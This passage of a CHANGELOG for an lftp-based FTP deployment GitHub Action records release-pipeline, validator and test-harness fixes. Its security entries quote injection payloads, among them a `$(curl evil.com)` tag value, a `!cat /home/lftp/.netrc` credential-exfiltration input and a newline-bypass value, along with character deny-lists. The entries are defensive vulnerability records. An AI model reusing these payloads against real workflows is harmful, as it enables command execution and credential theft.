- **Pre-release Docker tags no longer overwrite `:latest` (closes #275)** — `release.yml`'s "Resolve tag, version and enabled registries" step now detects a `-suffix` after the X.Y.Z root via `case "${version}" in *-*)` and conditionally skips the `:latest` alias for GHCR, Docker Hub (when secrets are set), and ECR Public (when enabled), plus the `all_tags` heredoc consumed by `docker/build-push-action`. A defense-in-depth assertion (`grep -Fq ':latest' "$GITHUB_OUTPUT"` followed by `::error:: + exit 1`) catches any future regression that re-introduces the alias. PR #276 already fixed the GitHub Release page side; this is the Docker-push counterpart. Stable tags (no `-suffix`) keep the `:latest` alias unchanged.

## [2.11.5] - 2026-09-05

### Security

- **Pre-release GitHub Releases no longer become Latest (closes #249)** — release candidates and other version tags with a suffix are explicitly marked as pre-releases and excluded from the repository's stable Latest release.

### Fixed

- **Integration test-server builds now fail fast and pass hadolint (closes #256 #263)** — package installation uses explicit `set -eu` handling and a parser-compatible configuration writer, preventing hidden package failures and hadolint parse errors.

## [2.11.4] - 2026-09-05

### Security

- **Tightened `release.yml` validator + shell-input plumbing (closes #211)** — three changes to `.github/workflows/release.yml` close a real shell-injection vector in the workflow_dispatch path:
  * The `validate-tag-input` job's case pattern was a loose shell glob (`v[0-9]*.[0-9]*.[0-9]*`) that accepted shell metachars after the version root (e.g. `v1.2.3$(curl evil.com)` would pass). Replaced with a `grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'` anchored regex that rejects everything except the documented version shape.
  * `inputs.version` and `github.event_name` were interpolated directly into `run:` blocks at the build `meta` step and the publish `meta` step. GitHub Actions expands template expressions before shell execution, so a workflow_dispatch caller with `version='$(...)'` could inject shell. Moved both to `env:` blocks; `INPUT_VERSION` and the runner-supplied `GITHUB_EVENT_NAME` / `GITHUB_REF_NAME` are now referenced via shell variables.
  * The publish job's `TAG=...` line used the same anti-pattern; replaced with `${INPUT_VERSION:-${GITHUB_REF_NAME}}`.

### Documentation

- **Docs hardening batch 2 (closes #270 #271)** — refresh stale description strings and one Makefile target:
  * **`action.yml` deny-list drift (#271)** — `lftp_settings`, `exclude`, `exclude_delete`, and `concurrency_lock_path` descriptions drifted from the actual validator behaviour after #160 (#246 follow-up) and #172 hardened `validate_glob_pattern` and `validate_path`. Refreshed each to match the implemented deny list: `lftp_settings` now mentions `newline`; `exclude`/`exclude_delete` now state that `;`, `&`, `|`, `"` are rejected as lftp command separators; `concurrency_lock_path` now lists `!` and `"` explicitly.
  * **`README.md` parallel updates (#271)** — `lftp-4.9.2` → `lftp-4.9.3` (matches the actual Dockerfile pin); Settings table row for `concurrency_lock_path` and the Exit-codes table row for `2` carry the same deny-list refresh.
- **`make test` now includes `bats unit` (closes #270)** — `Makefile:118` was `test: contract smoke`, which omitted the bats unit target and silently violated the AGENTS.md T1 contract (`contract + bats unit + smoke`). Changed to `test: contract unit smoke`; the unit target already no-ops when bats is missing, so the CI cold-start path stays unchanged.

### Fixed

- **`ci.yml` now serializes per-ref (closes #215)** — added a `concurrency:` block keyed on `ci-${{ github.workflow }}-${{ github.ref }}` with `cancel-in-progress: ${{ github.event_name == 'pull_request' }}`. PR runs cancel each other so a re-pushed branch never queues a stale full-suite run; main / tag / manual runs do NOT cancel so the Actions tab keeps the red run visible while a fix lands.
- **`release.yml` defensive output coupling (closes #217)** — the `dockerhub_image` / `ecr_image` GitHub Actions outputs were emitted only inside their enable conditional, leaving downstream cosign / SBOM guards with a potentially-undefined value if the conditional-output coupling ever broke. Added explicit empty-string / `enabled=false` echoes on the disabled branches and replaced the ECR branch's `if false; then` dead-code sentinel with a `ECR_DISABLED_FORCE:-` opt-in switch. Empty defaults are now always present, so future maintainers cannot trip over an undefined-output silent failure.
- **Issue-template dropdown drift + version-stamp sync (closes #219)** — five `.github/ISSUE_TEMPLATE/*.yml` files carried a "choose the action version" dropdown with three distinct ids (`action-version`, `action-version-affected`, `affected-version`) and stale `@v2.10.0` / `v2.9.2` examples; `SECURITY.md:7` had drifted to `v2.11.1`. Standardised on id `action-version` and label `"Action version"` (`security.yml` keeps the more specific `"Affected action version"` label per the issue's exact wording); refreshed all example versions to `@v2.11.4` (current `VERSION`); updated `SECURITY.md` `Currently maintained` stamp to match. Also added the missing `validations: required: true` to `idea.yml`'s version dropdown so it matches the other four templates.
- **`body_path` ternary in `release.yml:680` collapses to a constant (closes #267)** — the `&&` / `||` triple on the `Create GitHub Release` step collapsed both branches to `'release/CHANGELOG.body.md'` because GitHub Actions evaluates `&&` / `||` with JavaScript-style truthiness and `''` is falsy. The intent (empty `body_path` when no CHANGELOG section was extracted; `'release/CHANGELOG.body.md'` otherwise) was structurally unreachable. Replaced with the canonical `!= 'true' && '...' || ''` pattern that swaps the test and the branches so the operands are non-empty. Today the broken intent is masked by `softprops/action-gh-release@v3.0.2`'s graceful fallback to `generate_release_notes: true`, but a future bump that surfaces ENOENT would have started failing on the documented path. One-line change.

## [2.11.3] - 2026-09-04

### Security

- **Hardened input validation against `lftp -e` parser injection (closes #160, #171, #172)** — three related audit findings on the validator surface in `lib.sh`. PR #242:
  * **#171 (CRITICAL, RCE)** — five boolean (`ftp_ssl_allow`, `ssl_verify_certificate`, `ssl_check_hostname`, `ftp_passive_mode`, `ftp_use_feat`) and two duration (`net_timeout`, `dns_fatal_timeout`) inputs were not content-validated before flowing into `build_ftp_settings` → `lftp -e "set <key> <value>;"`. A workflow could set `ftp_ssl_allow: 'true; !cat /home/lftp/.netrc'` and the lftp shell-escape would exfiltrate the action's `.netrc` password before the cleanup trap fires. Added `validate_bool` (canonical lftp set: `true|false|yes|no|on|off|0|1|""`) and `validate_duration` (digits / digits+`[smhdSMHD]` / documented `"never"` sentinel).
  * **#172 (HIGH)** — `validate_path` rejected `;|&`` and `$` but not `!` (lftp shell escape) and `"` (lftp `-e` parser injection). Added both denials with explicit error messages; placed the `"` check before the generic shell-metacharacter check so the message is precise.
  * **#160 (HIGH)** — `INPUT_EXCLUDE` / `INPUT_EXCLUDE_DELETE` were routed through `validate_lftp_settings` since v2.11.2, which over-rejects legitimate glob/regex metacharacters (`!`, `;`, `$`, backtick). Added `validate_glob_pattern` that allows those (they are valid PatternSet / regex metacharacters) while still rejecting control chars and leading dash. `#172` tightened the path validator; `#160` was the docs-driven counterpart for the exclude inputs.
- **Hardened validators against newline bypass + `validate_int` grep bypass (F2 audit round, PR #246)** — the F2 audit round found that the v2.11.3 fixes left two related CRITICAL RCEs unclosed:
  * `validate_int` piped through `grep -qE '^[0-9]+$'`, which matches per LINE; a value like `2\n!cmd` satisfied the regex on the first line and slipped past validation. Replaced with a POSIX `case` pattern so the entire string (including any embedded newline) is checked.
  * `validate_path`, `validate_lftp_settings`, `validate_glob_pattern` all used `grep [[:cntrl:]]` to reject control chars, but `grep` never matches `\n` (it splits on `\n` before matching). An embedded newline bypassed the deny-list in all three. Added explicit `case`-based newline checks before the `grep` checks.
  * The `validate_glob_pattern` docstring claimed the value is "a single argv slot to `mirror`, never parsed by a shell" — FALSE. `build_mirror_command` concatenates the value **unquoted** into MIRROR_COMMAND, and `run_lftp_once` concatenates MIRROR_COMMAND into the `lftp -e` script body; `lftp` 4.9.3's parser treats `;`, `&`, `|`, `"` as command separators even mid-token. Re-introduce the command-separator rejection. `!`, backtick, `$`, and space remain allowed (legitimate PatternSet / regex metacharacters).

### Fixed

- **`release_lock_safely` no-ops when no sentinel is held (closes #188)** — the v2.11.2 EXIT trap on the lock-release branch was armed BEFORE `acquire_lock_with_recovery` had a chance to set `ACQUIRED_LOCK_SENTINEL`. If the script exited in the window (acquire timeout, signal, OOM), the trap fired with an empty sentinel and `release_lock_safely`'s else-branch issued `quote RMD .lftp-deployment.lock` against the FTP server — racing any parallel runner legitimately holding the lock. Guard `release_lock_safely` with an early return when neither the explicit `SENTINEL` arg nor `$ACQUIRED_LOCK_SENTINEL` is set. PR #243.
- **Test harness hardening (closes #136, #137, #156, #158, #159)** — five infra-debt findings, addressed together because the fix paths share the test-server / smoke image surfaces. PR #244:
  * **#156** — switch `make build-test-server-image` to `docker buildx build` (matches `release.yml`). The Dockerfile.test-server pins `# syntax=docker/dockerfile:1.4` and uses a heredoc; CI happened to pass only because the GH Actions runner ships Docker 23+ where BuildKit is the default.
  * **#158** — `chmod 0600` the env-file in scenarios 03 and 04 (mirrors the #133 fix at `tests/integration/lib/common.sh:406`). `INPUT_PASSWORD` was world-readable for the lifetime of the container.
  * **#159** — fix smoke test 11c arg parsing (was a single quoted argument conflating `INPUT_PASSWORD=foo` into `INPUT_SERVER`). Two separately-quoted args + assertion that `INPUT_PASSWORD=foo` reaches the container.
  * **#136** — pre-bake `lftp=4.9.3-r0` and `ca-certificates=20260611-r0` into `tests/integration/Dockerfile.test-server`; `lftp_run_script` and `wait_for_port` now use the pre-baked image instead of ephemeral `alpine:3.23.3` per call.
  * **#137** — new `tests/Dockerfile.smoke` pre-baked alpine-3.24 + lftp + ca-certificates (same pins as production). `tests/smoke.sh` inspects the image up-front and fails fast if missing. New `SMOKE_IMAGE` Makefile variable + `build-smoke-image` target. CI builds the image before `make smoke`.
- **CI / docs polish (closes #157, #162, #164, #197, #235)** — five small housekeeping fixes, addressed together because they share no code surface but all ship in the same batch. PR #245:
  * **#157** — drop the bash-only `[[ =~ ]]` tag-shape check in `release.yml::validate-tag-input` for a POSIX-portable `case` pattern.
  * **#162** — normalise four `set -e` / `set -eu` blocks in `release.yml` to `set -euo pipefail` to match the other nine steps in the same file.
  * **#197** — declare `outputs.log_file` in `action.yml`. `entrypoint.sh` was writing the key to `$GITHUB_OUTPUT` but `action.yml` never declared it. For Docker actions the runner surfaces the key regardless, so the output has been technically reachable; declaring gives typed-actions consumers + IDE autocomplete a schema, and matches GitHub's "strongly recommended" metadata guidance. `tests/contract.sh` updated so the input-scraping awk stops at `^outputs:` as well as `^runs:` (both are top-level siblings of `inputs:` for Docker actions).
  * **#164** — fix the doc drift in `action.yml:113` concurrency_lock description: it said lftp issues `quote MKD <path>` before the mirror, but since v2.11.0 (#121) it issues the high-level `mkdir <path>`. The release path still uses raw `quote RMD` (locks the in-place unit test suite), so the doc fix is scoped to MKD only.
  * **#235** — add missing CHANGELOG link-references for `v2.11.0`, `v2.11.1`, `v2.11.2` (the issue only mentioned two of the three); reorder the bottom footer to descending version order.

## [2.11.2] - 2026-09-03

### Added

- **None.**

### Changed

- **FTPS test infrastructure hardening** — eight cleanups / fixes for the FTPS integration scenarios added in v2.11.0 (#120, PR #130) and the pre-baked test server image added in v2.11.1 (#135, PR #139). The pre-baked image made startup fast enough that pre-existing test-helper quirks became visible; this release closes them.

  * **`generate_self_signed_cert` validates cached cert with `openssl x509 -checkend 86400`** — the cached `/tmp/ftpint-certs/server.pem` was reused on every run with no validity check, but the cert is `-days 1`, so a cached cert from a previous run is invalid 24h after generation. Self-hosted runners and local dev boxes (persistent `/tmp`) would hand the next scenario a stale cert that fails the TLS handshake at runtime. CI is silent today because the FTPS scenarios disable cert / hostname verification, but production users hitting the same path would see a hard failure. Checkend 86400 regenerates when the cert expires within 24h; also catches corrupt / wrong-format cached PEMs.
  * **Scenario credentials validated against `[A-Za-z0-9_]` in `scenario_setup`** — `start_ftps_server` interpolates `${FTP_USER}` / `${FTP_PASSWORD}` into a `-c` payload that runs inside the FTPS container with `--network host` and a bind-mounted `/home/vsftpd`. The current generator (`u$$_$(rand_suffix)` / `p$$_$(rand_suffix)`) is alphanumeric + underscore + digits so the single-quote-wrapped literal is safe today, but the contract was implicit. The guard surfaces a loud `log_fail` if a future refactor introduces special chars (the silent-break / shell-injection vector the issue flagged), instead of letting the next scenario fail with a confusing mid-test error.
  * **`adduser` error masking fixed in `start_ftps_server`** — the `-c` payload ran `adduser -D -h /home/vsftpd ${user} 2>/dev/null || true`, which swallowed ALL errors from `adduser`, not only the "already exists" case the comment implied. Real failures (read-only `/etc/passwd`, cross-device chown, PAM path errors) now exit 1 with the adduser error message instead of failing later as a confusing "530 Login incorrect" from vsftpd. Captures stderr to a tmpfile and matches `"*already exists*"` as the only benign failure.
  * **FTPS overlay `vsftpd.conf` cleaned up on EXIT trap** — `start_ftps_server` creates an overlay `vsftpd.conf` via `mktemp -t vsftpdconf.XXXXXX` and bind-mounts it into the FTPS container; the file was only deleted in the `docker run` failure branch. On the success path the ~700-byte file persisted in `/tmp`. Now exported as `FTP_VSFTPD_CONF` (mirroring `FTP_CONTAINER_NAME` / `FTP_DATA_DIR`) and added to the EXIT trap in scenarios 03 and 04 with `${FTP_VSFTPD_CONF:-}` so the trap is safe when `start_ftps_server` failed before exporting.
  * **`FTP_IMPLICIT_PORT` exposed (no more hardcoded 2122)** — the implicit-FTPS host port (2122) was duplicated between `start_ftps_server`'s `mode=implicit` branch and scenario 04's `_implicit_host_port=2122`. Exported as `FTP_IMPLICIT_PORT` (default 2122) from `self-signed-cert.sh`, mirroring the `FTP_CONTROL_PORT` pattern from `common.sh`. Both call sites now read the same variable.
  * **Redundant `set net:max-retries 1` removed from FTPS scenarios** — scenarios 03 and 04 appended `set net:max-retries 1` to `INPUT_LFTP_SETTINGS`, but `lib.sh::build_ftp_settings` already emits it as the default. The duplicate was a no-op (lftp takes the last `set` for the same key) and misled future maintainers. Kept `set net:persist-retries 0` (which IS overriding the default `5` and is required by #120). Behaviour unchanged.
  * **Dead code + no-op `mkdir` removed from test-server build** — `tests/integration/lib/common.sh:140` (`wait_for_port`) had `if _wfp_busybox_ok=1; then :; fi`, an assignment whose value was discarded and whose then-branch was a no-op. `tests/integration/Dockerfile.test-server`'s `mkdir -p /var/log/vsftpd /etc/pam.d /home/vsftpd` was a triple no-op (`/etc/pam.d` is part of alpine's base filesystem; `/home/vsftpd` is bind-mounted at runtime, overwriting any build-time mkdir). Reduced to `mkdir -p /var/log/vsftpd`. Doc-comment updates in `self-signed-cert.sh` mirror the change.
  * **`make clean` respects `RUNTIME`** — the target hardcoded `docker rmi`, so a podman-only developer saw the rmi fail silently and their images were never removed. Detect runtime at parse time (matching `tests/integration/lib/common.sh`), use `make -` prefix for ignore-errors. `make build` / `make build-test-server-image` keep their explicit `docker` invocations — docker is the CI runtime and the local dev / CI parity check wants the build to fail loudly if docker is missing.
  * **Makefile exports `IMAGE` / `TEST_SERVER_IMAGE`** — the prior Makefile defaults were not exported, so a developer who ran `make build IMAGE=mytag:local && make build-test-server-image TEST_SERVER_IMAGE=mytag-server:local && make integration` had `make integration` use the Makefile's hardcoded `:ci-integration` fallback instead of the locally-built `mytag-server:local` (each `make` invocation is a fresh shell; command-line overrides do not persist without `export`). CI already passes both on the command line and was unaffected.

### Fixed

- **`INPUT_EXCLUDE` / `INPUT_EXCLUDE_DELETE` are no longer silent no-ops on `lftp` 4.9.3 (closes #131)** — `lib.sh::build_mirror_command` now appends `mirror -x <regex>` for `INPUT_EXCLUDE` (POSIX ERE) and `mirror -X <glob>` for `INPUT_EXCLUDE_DELETE` (lftp's `PatternSet::Glob`). Verified against `lftp` 4.9.3 source (`MirrorJob.cc::AddPattern`): there is no `mirror:exclude-file` query in the source — neither `set mirror:exclude` (nor `-file`) nor `set mirror:exclude-regex` alone does anything when `mirror` runs without an `-x` flag. The mirror command's `-x` / `-X` flags are what actually apply the exclusion, and the `set`-based directives the action emitted instead have been silent no-ops since v2.5.0. The v2.11.2 first-pass fix (the `set -a; ...; set -a;` workaround) was based on the issue's claim that `lftp` 4.9.3 hides `mirror:exclude-file` behind `set -a`; that claim is verified-incorrect by reading the source, so the workaround was reverted and this entry rewritten to match the shipped code — see the `lib.sh::build_ftp_settings` docstring (`lib.sh:297`), which records why the two inputs are no longer emitted as `set` directives. Users who set `delete: true` together with `INPUT_EXCLUDE_DELETE='*.bak'` (or `INPUT_EXCLUDE='.*\.bak'`) to preserve a list of remotely-managed files from the mirror's `--delete` pass now get the documented behaviour (the pattern is honoured end-to-end); pre-fix, `lftp` either rejected the directive or silently ignored it, and the matching files were deleted. **API note**: `INPUT_EXCLUDE` switched from shell-glob to POSIX ERE (lftp's `mirror -x` is regex-based) — users currently passing `*.bak` etc. to `INPUT_EXCLUDE` will need to convert to `.*\.bak` (`*.bak` for `INPUT_EXCLUDE_DELETE` via `mirror -X` still uses glob semantics). `INPUT_EXCLUDE` and `INPUT_EXCLUDE_DELETE` apply to BOTH upload and delete operations in `lftp` 4.9.3 (no separate delete-only-exclude variable exists). `action.yml::exclude` / `exclude_delete` descriptions and the new `parse.bats` assertions document the new semantics: `build_ftp_settings` is asserted to emit no `mirror:exclude*` directive at all, and `build_mirror_command` is asserted to append `-x <regex>` / `-X <glob>`. `tests/smoke.sh` (tests 25-27) asserts end-to-end through `entrypoint.sh` that `INPUT_EXCLUDE=*.map` / `INPUT_EXCLUDE_DELETE=*.bak` inject `mirror -x *.map` / `mirror -X *.bak` into the resolved `MIRROR_COMMAND`, that `FTP_SETTINGS` carries no `set mirror:exclude*` directive, and that the default case (both inputs empty) still produces no `mirror:exclude` directive at all — the backward-compatibility control. The integration scenario `11-exclude-delete-protects-remote.sh` was rewritten around the `mirror -X <glob>` mechanism (its header documents why the older `set mirror:exclude-file` directive was a no-op) and exercises the action end-to-end against a real vsftpd: it pre-seeds the FTP user's home with `stale.html` (must be removed by `--delete`) and `important.bak` (matches `*.bak`, must survive), invokes the action image with `INPUT_DELETE=true` + `INPUT_EXCLUDE_DELETE='*.bak'`, and asserts all three states. The scenario is deliberately black-box — it asserts the resulting FTP-server state, not the `MIRROR_COMMAND` string, so it catches a regression in either the flag construction or lftp's handling of it. Supersedes the `INPUT_EXCLUDE_DELETE is a no-op on lftp 4.9.3` entry under v2.11.0 "Known limitations" AND the previously-announced v2.11.2 fix (the `set -a` workaround was verified not to work).
- **`acquire_lock_with_recovery` and `release_lock_safely` now apply the v2.11.0 URL rewrite (closes #132)** — the v2.11.0 fix that rewrites `INPUT_SERVER` from `ftp://host:port` to `ftp://<user>@host:port` (so `lftp` 4.9.3's `.netrc` lookup actually fires) was only applied in `run_lftp_once`. The two lftp invocations that drive the concurrency lock path (`acquire_lock_with_recovery` and `release_lock_safely` via the EXIT trap) bypassed the rewrite, so against the production-default bare-host `INPUT_SERVER=ftp://host:port` lftp fell back to `USER anonymous`, the FTP server rejected with 530, and the lock-acquire loop spun until `INPUT_CONCURRENCY_LOCK_TIMEOUT`. The rewrite is extracted into a shared `rewrite_lftp_url SERVER USER` helper used by all three lftp-invoking functions so they cannot drift again. Scenarios `09-concurrency-lock-e2e.sh` and `10-stale-lock-recovery.sh` drop their scenario-level `INPUT_SERVER=ftp://user@host:port` workaround; new scenario `12-acquire-vs-bare-host-url.sh` exercises the production code path end-to-end.
- **Test harness no longer leaks `INPUT_PASSWORD` through `podman`/`docker` argv (closes #133)** — `tests/integration/scenarios/07-self-hosted-home.sh` invoked the action image with `-e INPUT_PASSWORD=...` (and four sibling `-e` flags), which puts the password into the runtime's argv — visible via `cat /proc/<pid>/cmdline` and `ps aux` while the container is alive, and briefly readable to any other process running as the same uid on the host. The next release rewrites the invocation to build an env-file via `build_action_env_file` (with `HOME=/github/home` as an extra kv) and pass it via `--env-file "${_env}"`, matching the pattern scenarios 08/09/10 already use. `Makefile::run` is hardened the same way (`mktemp` + `chmod 0600` + `--env-file`). The `chmod 0600` is also applied inside `build_action_env_file` itself, so scenarios 08/09/10 — which were already on env-file but relied on the host `mktemp` flavour to produce 0600 — now get it portably (alpine busybox `mktemp -t` defaults to 0644). Scenarios 03 and 04 do not use `build_action_env_file` and are out of scope; their inline env-file writes were not changed. The harness leak was test-only (the synthetic `ftptest` / `ftptest` credential is not real), but the pattern would have leaked a real password if a contributor wired a `secrets.*` value into scenario 07.
- **EXIT trap release now gated on `concurrency_lock=true` (post-#132 regression)** — `entrypoint.sh` previously installed the EXIT trap's lock-release branch unconditionally, which issued an lftp `quote RMD .lftp-deployment.lock` against the FTP server on every default-mode action run (the default `INPUT_CONCURRENCY_LOCK_PATH` is non-empty regardless of `INPUT_CONCURRENCY_LOCK`). Pre-fix this caused a spurious ~30s lftp round-trip on every default-mode run, and a real race where a parallel `concurrency_lock=true` runner could see its in-use lock RMDed by the EXIT trap of a default-mode runner sharing the same lock path. The lock-release portion is now registered only when `concurrency_lock=true`.
- **`acquire_lock_with_recovery` surfaces sentinel-PUT exit code (post-#132 regression)** — the MKD-success branch discarded the sentinel-PUT exit code; a MKD success + PUT failure returned 0 with `ACQUIRED_LOCK_SENTINEL` set but no file on the FTP server. The next runner then took over the lock while the original was mid-mirror; both mirrored concurrently, defeating the serialization `concurrency_lock` exists to provide. PUT failures now loop back into the same stale-recovery / retry path that MKD failures already use.
- **Documentation drift corrected** — five pre-existing doc-vs-code mismatches closed: README Settings table `ssl_verify_certificate` default (`false` → `true`, matching `action.yml` since v2.0.0); README license badge (`GPL-3.0` → `AGPL-3.0`, matching `LICENSE` since v2.2.0); `SECURITY.md` "Currently maintained" latest (`v2.10.0` → `v2.11.1`); CHANGELOG v2.10.0 ECR Public URL (`airvzxf` → `m2z1h0m9`, the actual AWS-assigned registry ID); `action.yml:85` `lftp_settings` description no longer claims the input is unvalidated (lib.sh::validate_lftp_settings does reject control chars, backtick, `$`, `!`, and >3 `;`). Also fixed `CHANGELOG.md`'s `[Unreleased]` block, which had duplicate Added/Changed/Fixed headers and a verbatim-duplicated `#131` entry due to the merge of the release-pipeline work (#152, #153) into the v2.11.2 work.

## [2.11.1] - 2026-09-03

Pre-baked FTPS test server image (PR #139, closes #135): scenarios 03 (explicit) and 04 (implicit) no longer pay the per-run `apk add --no-cache` cost, eliminating the apk-index download race that intermittently failed CI.

### Added

- **Release pipeline with tag-signature guard (port of `airvzxf/moagan` PR #737, PR #152)** — `.github/workflows/release.yml` is now a five-job pipeline (`validate-tag-input` → `verify-tag-reachability` ∥ `verify-tag-signature` → `build` → `publish`) with two parallel verify jobs that gate the build. `validate-tag-input` regex-checks the dispatch input. `verify-tag-reachability` enforces the AGENTS.md "tag the trunk merge commit, NOT the branch tip" rule mechanically (`git merge-base --is-ancestor`). `verify-tag-signature` runs `git verify-tag` against an in-repo allow-list fetched from `origin/main` (so revoking a key on main takes effect on the next release). The `build` job checks out the immutable tag commit SHA (not the mutable ref) so a tag force-push mid-run cannot redirect the build. `publish` is the only job with `contents: write`. Top-level `concurrency: release-<tag>` prevents two `release.yml` runs against the same tag from racing the publish step.
- **In-repo trusted-signers allow-list** — two new files under `.github/`. `.github/trusted-signers` is the SSH backend (one line: the maintainer's ED25519 key, fingerprint `SHA256:POu2Sr8ILb1IM05Vh1cGU3xivjx05QjWoWYhdLc6YHA`). `.github/trusted-signers.asc` is the PGP backend (ASCII-armored RSA key, fingerprint `82DE44111B30F91F55BCEB1F414687A3CD7E65B9`, used for `v1.5.0` … `v2.10.0`). `git verify-tag` auto-detects the tag's signature format; the workflow imports the PGP key into a temp keyring only when the tag is PGP-signed, so SSH-only releases never need the `.asc` file (keeps the documented key-removal path in AGENTS.md intact).
- **`AGENTS.md`** — project-level agent instructions mirroring the structure of `airvzxf/moagan`'s `AGENTS.md` (complementary to the existing `ROADMAP.md`). Documents the tag-signature guard, the dual-backend allow-list, the local-verification command, the "tag the trunk merge commit" procedure, and the red-workflow repair loop. The procedural rules are load-bearing; the workflow guards are the structural check.
- **`scripts/verify-tag.sh`** — single-purpose local re-verifier. Imports the PGP allow-list into a `mktemp -d` keyring (so the developer's permanent `~/.gnupg` is untouched), configures git via per-invocation `git -c` overrides (so `.git/config` is untouched), and runs `git verify-tag` against the tag. Handles SSH-signed (`v2.11.0+`), PGP-signed (`v2.10.0` and earlier), and lightweight (`v1.0-alpha.1` … `v1.3.3`, exits 0 with INFO) tags. Shellcheck-clean.

### Changed

- **`SECURITY.md` (Tag signing policy)** — replaced the out-of-date "GPG-signed" claim with a per-tag-range table covering all three historical formats (lightweight legacy, PGP, SSH), and added the local-verification command (`scripts/verify-tag.sh <tag>`).
- **ECR Public publishing temporarily disabled (PR #153)** — the `AWS_ROLE_TO_ASSUME` secret is configured in the repo, but the IAM role's OIDC trust policy is not configured to allow this repo, so `Configure AWS credentials (OIDC) for ECR Public` fails with `Not authorized to perform sts:AssumeRoleWithWebIdentity` (the role was set up under an AWS account the maintainer no longer has access to). The two ECR Public steps (`Configure AWS credentials`, `Log in to ECR Public`) and the ECR branch in the meta step are commented out, and the `if false; then` in the meta step emits a `::notice::ECR Public publishing disabled...` line on every release. The cosign sign + SBOM attestation steps for ECR Public remain in the file (gated on `if: ecr_enabled == 'true'`, which is never set), so re-enabling the feature is a one-line change in two places once the IAM trust policy is fixed. The pipeline now publishes to **ghcr.io (always) + Docker Hub (when `DOCKERHUB_USERNAME`/`DOCKERHUB_TOKEN` are set)** only. See the comment in `.github/workflows/release.yml` for the exact re-enable diff.

### Fixed

- **Pre-baked FTPS test server image (closes #135)** — `tests/integration/Dockerfile.test-server` + `make build-test-server-image` + CI integration step. Scenarios 03 (explicit) and 04 (implicit) no longer pay the per-run `apk add --no-cache` cost, eliminating the apk-index download race that intermittently failed CI (closes #135). Run `make build-test-server-image TEST_SERVER_IMAGE=...` before `make integration`.

## [2.11.0] - 2026-09-02

Real FTP integration test harness (PR #123, closes #117); FIXED #111 (`HOME` inheritance on self-hosted runners, PR #126, closes #119); lftp netrc quirk (PR #127, closes #124); documentation update (PR #128, closes #122); concurrency_lock end-to-end + lib.sh MKD/LIST fix (PR #129, closes #121); FTPS explicit + implicit coverage (PR #130, closes #120).

### Added

- **FTPS integration scenarios (closes #120, PR #130)** — scenarios `03-ftps-explicit-upload.sh` and `04-ftps-implicit-upload.sh` (which were `exit 0` placeholders since #117) now boot a real SSL/TLS-enabled `alpine:3.23.3` + vsftpd (3.0.5-r3) with a self-signed cert and exercise the action end-to-end. Explicit FTPS uses the AUTH TLS upgrade on the standard control port (`ftp://...:2121`, `INPUT_FTP_SSL_ALLOW=true` + `INPUT_LFTP_SETTINGS="set ftp:ssl-force true;set net:persist-retries 0;set net:max-retries 1;"`); implicit FTPS uses TLS from byte 0 on a dedicated port (`ftps://...:2122`, `implicit_ssl=YES` on the server). A new helper `tests/integration/lib/self-signed-cert.sh` generates the ephemeral cert (rsa:2048 / 1-day / CN=localhost, cached under `FTP_INTEGRATION_CERT_DIR`, default `/tmp/ftpint-certs`) and exposes `start_ftps_server` to wrap the cert mount and the vsftpd launch with the SSL config both scenarios need. The overlay vsftpd.conf sets `ssl_ciphers=HIGH:MEDIUM:!DHE:!DH` so the server-side key exchange is ECDHE-only, which sidesteps the OpenSSL-3.x-vs-vsftpd-3.0.5 incompatibility where the action's lftp (OpenSSL 3.x) would otherwise reject vsftpd's built-in 1024-bit DH params as "dh key too small" (vsftpd 3.0.5 has no `ssl_dh_file` directive). `lib/common.sh`, the seven passing scenarios (01, 02, 05, 07, 08, 09, 10), and `entrypoint.sh` / `lib.sh` are untouched.
- **Real FTP integration test harness (PR #123, closes #117)** — `tests/integration/` directory with 5 initial scenarios against a real `fauria/vsftpd`. Each scenario boots its own FTP server container, exercises the action end-to-end, and tears the container down on exit. The harness auto-detects Docker/Podman, includes a Makefile `integration` target, and surfaces in CI under `.github/workflows/ci.yml` as a separate job. Five initial scenarios: plain FTP upload, plain FTP delete, FTPS explicit (stub), FTPS implicit (stub), `exclude` + `exclude_delete`. The scenarios are stub-friendly — adding a new scenario is a single file drop into `tests/integration/scenarios/` and the harness discovers it on the next `make integration`.
- **Issue templates for typed bug / feature / idea / documentation / question / security reports** (PR #113, closes #112). Seven GitHub Issue Forms now live under `.github/ISSUE_TEMPLATE/`:
  * `bug.yml`, `feature.yml`, `idea.yml`, `documentation.yml`, `question.yml`, `security.yml` — typed forms with version / symptom / symmetry dropdowns anchored to the "Supported versions" table in `SECURITY.md`.
  * `config.yml` — keeps the "Blank issue" option in the chooser and adds `contact_links` to Discussions, `SECURITY.md`, and the README troubleshooting table.

### Changed

- **`SECURITY.md`** (PR #113):
  * The "Supported versions" table is split into three tracks (currently maintained / legacy support window / end-of-life) so floating refs (`@latest`, `@master`, `@main`) cannot be confused with supported tags.
  * The tag-signing policy now names the `keys.openpgp.net` URL to fetch the maintainer's public key for offline verification.
  * The reporting section mentions the GitHub Security Advisories tab as an alternative channel, conditional on it being enabled.
  * The disclosure section adds a clause that public issues reporting vulnerabilities will be closed without triage and linked back to `SECURITY.md`.
  * The fix-flow bullet adds a CVE / CWE note for vulnerabilities published as a GitHub Security Advisory.

### Fixed

- **#111** (closes #119, PR #126) — `entrypoint.sh` trusted the inherited `HOME` from self-hosted runners, causing `can't create /github/home/.netrc: Permission denied` when the runner forwarded `HOME=/github/home` (or any other host path) into the container. v2.11.0 pins `NETRC=/home/lftp/.netrc` and `export HOME=/home/lftp` unconditionally, closing the bug. The `env: HOME: /home/lftp` workaround is no longer required (it remains valid).
- **#124** (PR #127) — the `ftp-deployment-action` was inert against every real FTP server: `lftp` 4.9.3 (the version pinned in `Dockerfile`) ignores `.netrc` when the URL has a scheme but no embedded user, falling back to `USER anonymous`. v2.11.0 rewrites `INPUT_SERVER` from `ftp://host:port` to `ftp://<user>@host:port` inside `lib.sh::run_lftp_once` (only when the URL has no embedded user), so the lftp netrc lookup actually fires. The password still comes from the `.netrc` written by the action (B-03 is preserved; only the user is in the URL, which is the documented safe form per the audit in #124).
